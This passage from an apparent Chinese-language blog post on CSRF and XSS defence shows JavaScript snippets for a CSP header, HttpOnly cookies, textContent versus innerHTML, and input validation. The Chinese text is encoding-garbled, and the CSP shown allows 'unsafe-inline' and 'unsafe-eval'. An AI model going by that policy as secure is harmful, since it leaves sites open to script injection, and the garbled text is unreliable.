</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Security-Policy&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;;&#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">next</span>();
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>üíâHttpOnly Cookie</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Ë®≠ÁΩÆ HttpOnly cookie
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">cookie</span>(<span style="color:#e6db74">&#39;sessionId&#39;</span>, <span style="color:#e6db74">&#39;abc123&#39;</span>, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">httpOnly</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">secure</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>üíâÈÅøÂÖçÁõ¥Êé•Êìç‰ΩúDOM</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// ‰∏çÂÆâÂÖ®ÁöÑÂÅöÊ≥ï
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">userInput</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ÂÆâÂÖ®ÁöÑÂÅöÊ≥ï
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">userInput</span>;
</span></span></code></pre></div><p>üíâReact„ÄÅVue„ÄÅAngularÊ°ÜÊû∂ÈÉΩÂÖßÂª∫XSSÈò≤Ë≠∑</p>
<ul>
<li>‰ΩÜÈúÄÊ≥®ÊÑè‰ΩøÁî® dangerouslySetInnerHTML Á≠âÁâπÊÆä API</li>
</ul>
<p>üíâÊ≠£ÂâáÈ©óË≠â</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// È©óË≠âËº∏ÂÖ•ÊòØÂê¶Á¨¶ÂêàÈ†êÊúüÊ†ºÂºè
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">isValidInput</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">input</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">/^[a-zA-Z0-9]+$/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">input</span>);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><ul class="pa0">
  
   <li class="list di">
     <a href="/lioouzzz/sleepblog.git/tags/%E8%B3%87%E5%AE%89/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Ë≥áÂÆâ</a>
   </li>
  
   <li class="list di">
     <a href="/lioouzzz/sleepblog.git/tags/%E5%89%8D%E7%AB%AF/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">ÂâçÁ´Ø</a>
   </li>
  
   <li class="list di">
     <a href="/lioouzzz/sleepblog.git/tags/%E5%BE%8C%E7%AB%AF/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">ÂæåÁ´Ø</a>
   </li>
  
</ul>
<div class="mt6 instapaper_ignoref">
      
      
      </div>
    </div>

    <aside class="w-30-l mt6-l"><div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
    <p class="f5 b mb3">ÊñáÁ´†ÁõÆÈåÑ</p>
      <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#csrfcross-site-request-forgeryË∑®Á´ôË´ãÊ±ÇÂÅΩÈÄ†">CSRF(Cross-Site Request Forgery)ÔºåË∑®Á´ôË´ãÊ±ÇÂÅΩÈÄ†</a></li>
        <li><a href="#ËàâÂÄã‰æãÂ≠ê‰æÜË™™ÊòéÊîªÊìäÊµÅÁ®ã">ËàâÂÄã‰æãÂ≠ê‰æÜË™™ÊòéÊîªÊìäÊµÅÁ®ãÔºö</a>
          <ul>
            <li><a href="#1‰ΩøÁî®ËÄÖÁôªÂÖ•Á∂≤Á´ô">1.‰ΩøÁî®ËÄÖÁôªÂÖ•Á∂≤Á´ô</a></li>
            <li><a href="#2ÊîªÊìäËÄÖË™òÂ∞é‰ΩøÁî®ËÄÖË®™ÂïèÊÉ°ÊÑèÁ∂≤Á´ô">2.ÊîªÊìäËÄÖË™òÂ∞é‰ΩøÁî®ËÄÖË®™ÂïèÊÉ°ÊÑèÁ∂≤Á´ô</a></li>
            <li><a href="#3‰ΩøÁî®ËÄÖÁöÑÁÄèË¶ΩÂô®ÁôºÈÄÅË´ãÊ±Ç">3.‰ΩøÁî®ËÄÖÁöÑÁÄèË¶ΩÂô®ÁôºÈÄÅË´ãÊ±Ç</a></li>
            <li><a href="#4Á∂≤Á´ôÂü∑Ë°åÊú™Á∂ìÊéàÊ¨äÁöÑÊìç‰Ωú">4.Á∂≤Á´ôÂü∑Ë°åÊú™Á∂ìÊéàÊ¨äÁöÑÊìç‰Ωú</a></li>
          </ul>
        </li>
        <li><a href="#Â¶Ç‰ΩïÈ†êÈò≤csrfÊîªÊìä">Â¶Ç‰ΩïÈ†êÈò≤CSRFÊîªÊìä</a></li>
        <li><a href="#xss-cross-site-scriptingÊîªÊìä">XSS (Cross-Site Scripting)ÊîªÊìä</a></li>
        <li><a href="#xssÈ°ûÂûã">XSSÈ°ûÂûã</a></li>
        <li><a href="#Â∏∏Ë¶ãÁöÑÊîªÊìäÁõÆÊ®ô">Â∏∏Ë¶ãÁöÑÊîªÊìäÁõÆÊ®ô</a></li>
        <li><a href="#Èò≤ÁØÑxssÊîªÊìäÊé™ÊñΩ">Èò≤ÁØÑXSSÊîªÊìäÊé™ÊñΩ</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</aside>

  </article>

    </main>
    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/lioouzzz/sleepblog.git/" >
    &copy;  üçÄüçÄüçÄ 2025 
  </a>
    <div><div class="ananke-socials"></div>
</div>
  </div>
</footer>


  </body>
</html>
